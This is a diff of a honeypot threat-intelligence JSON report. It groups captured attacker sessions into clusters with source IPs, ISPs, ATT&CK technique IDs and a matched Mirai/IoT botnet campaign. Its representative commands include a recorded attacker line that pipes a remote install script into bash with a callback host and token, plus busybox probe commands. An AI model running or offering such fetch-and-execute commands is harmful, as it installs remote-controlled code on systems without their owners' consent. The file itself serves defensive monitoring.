@@ -1,56 +1,88 @@
 {
-  "generated_at": "2026-06-12T18:10:40.579390+00:00",
-  "total_sessions_with_commands": 3,
-  "total_clusters": 2,
-  "campaign_clusters": 0,
-  "singleton_clusters": 1,
-  "highest_severity": "NONE",
-  "active_campaigns": [],
+  "generated_at": "2026-06-12T21:51:20.553371+00:00",
+  "total_sessions_with_commands": 4,
+  "total_clusters": 3,
+  "campaign_clusters": 1,
+  "singleton_clusters": 2,
+  "highest_severity": "HIGH",
+  "active_campaigns": [
+    {
+      "cluster_id": "CLU-001",
+      "name": "Mirai/IoT Botnet",
+      "severity": "HIGH",
+      "session_count": 2,
+      "unique_ip_count": 2,
+      "ttps": [
+        "T1082",
+        "T1105",
+        "T1059.004"
+      ]
+    }
+  ],
   "clusters": [
     {
       "cluster_id": "CLU-001",
-      "is_campaign": false,
-      "campaign_name": null,
-      "campaign_severity": null,
-      "campaign_description": null,
-      "matched_campaigns": [],
+      "is_campaign": true,
+      "campaign_name": "Mirai/IoT Botnet",
+      "campaign_severity": "HIGH",
+      "campaign_description": "Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.",
+      "matched_campaigns": [
+        {
+          "name": "Mirai/IoT Botnet",
+          "ttps": [
+            "T1105",
+            "T1059.004"
+          ],
+          "severity": "HIGH",
+          "description": "Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.",
+          "pattern_hits": 2,
+          "pattern_total": 3
+        }
+      ],
       "session_count": 2,
       "unique_ips": [
-        "138.2.98.41"
+        "176.65.148.251",
+        "74.208.181.249"
       ],
-      "unique_ip_count": 1,
-      "sequence_hash": "d2af147dd3fa2817",
+      "unique_ip_count": 2,
+      "sequence_hash": "3142de6db2386023",
       "ttps": [
         {
+          "id": "T1082",
+          "name": "System Information Discovery"
+        },
+        {
           "id": "T1105",
-          "name": "Ingress Tool Transfer"
+          "name": "T1105"
+        },
+        {
+          "id": "T1059.004",
+          "name": "T1059.004"
         }
       ],
       "representative_commands": [
-        "command -v python3 >/dev/null 2>&1 || (apt-get update -y && apt-get install -y python3) || yum install -y python3",
-        "apt-get update -y",
-        "apt-get install -y python3",
-        "python3 /tmp/bendi.py",
-        "rm /tmp/bendi.py",
-        "if ! command -v curl &> /dev/null; then apt-get update -y && apt-get install -y curl || yum install -y curl; fi",
-        "bash <(curl -sL https://raw.githubusercontent.com/komari-monitor/komari-agent/refs/heads/main/install.sh) -e https://sexy.pp.ua --auto-discovery DsR94pYWmSUpC3n43RmwPxKw"
+        "echo SHELL_TEST",
+        "uname -h",
+        "/bin/busybox TEST",
+        "cat /proc",
+        "./"
       ],
       "members": [
         {
-          "session_id": "IR-2e11b23ad475",
-          "src_ip": "138.2.98.41",
-          "country": "SG",
-          "isp": "Oracle Corporation",
-          "command_count": 7,
-          "timestamp": "2026-06-12T16:32:57.078031Z"
+          "session_id": "IR-74180340e00b",
+          "src_ip": "176.65.148.251",
+          "country": "NL",
+          "isp": "Pfcloud UG",
+          "command_count": 5,
+          "timestamp": "2026-06-12T17:45:07.336173Z"
         },
         {
-          "session_id": "IR-adec2d2df369",
-          "src_ip": "138.2.98.41",
-          "country": "SG",
-          "isp": "Oracle Corporation",
-          "command_count": 7,
-          "timestamp": "2026-06-12T16:35:23.520701Z"
+          "session_id": "IR-572ade9b1445",
+          "src_ip": "74.208.181.249",
+          "country": "US",
+          "isp": "IONOS Inc.",
+          "command_count": 4,
+          "timestamp": "2026-06-12T18:14:52.510579Z"
         }
       ]
     },
@@ -63,24 +95,56 @@
       "matched_campaigns": [],
       "session_count": 1,
       "unique_ips": [
-        "74.82.47.5"
+        "35.203.211.88"
       ],
       "unique_ip_count": 1,
-      "sequence_hash": "23324325c4a89b7b",
-      "ttps": [],
+      "sequence_hash": "49efc5eb7bb5604b",
+      "ttps": [
+        {
+          "id": "T1083",
+          "name": "File & Directory Discovery"
+        }
+      ],
       "representative_commands": [
-        "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
-        "Accept: */*",
+        "User-Agent: Hello from Palo Alto Networks, find out more about our scans in https://docs-cortex.paloaltonetworks.com/r/1/Cortex-Xpanse/Scanning-activity",
         "Accept-Encoding: gzip"
       ],
       "members": [
         {
-          "session_id": "IR-9cbeeb46c092",
-          "src_ip": "74.82.47.5",
-          "country": "US",
-          "isp": "The Shadowserver Foundation, Inc.",
-          "command_count": 3,
-          "timestamp": "2026-06-12T14:59:18.950533Z"
+          "session_id": "IR-5c33012db513",
+          "src_ip": "35.203.211.88",
+          "country": "GB",
+          "isp": "Google LLC",
+          "command_count": 2,
+          "timestamp": "2026-06-12T20:20:42.795112Z"
+        }
+      ]
+    },
+    {
+      "cluster_id": "CLU-003",
+      "is_campaign": false,
+      "campaign_name": null,
+      "campaign_severity": null,
+      "campaign_description": null,
+      "matched_campaigns": [],
+      "session_count": 1,
+      "unique_ips": [
+        "128.1.132.136"
+      ],
+      "unique_ip_count": 1,
+      "sequence_hash": "4ade1590247e2996",
+      "ttps": [],
+      "representative_commands": [
+        "Accept: */*"
+      ],
+      "members": [
+        {
+          "session_id": "IR-c255ea2e1e0c",
+          "src_ip": "128.1.132.136",
+          "country": "HK",
+          "isp": "UCLOUD",
+          "command_count": 1,
+          "timestamp": "2026-06-12T19:38:10.447198Z"
         }
       ]
     }
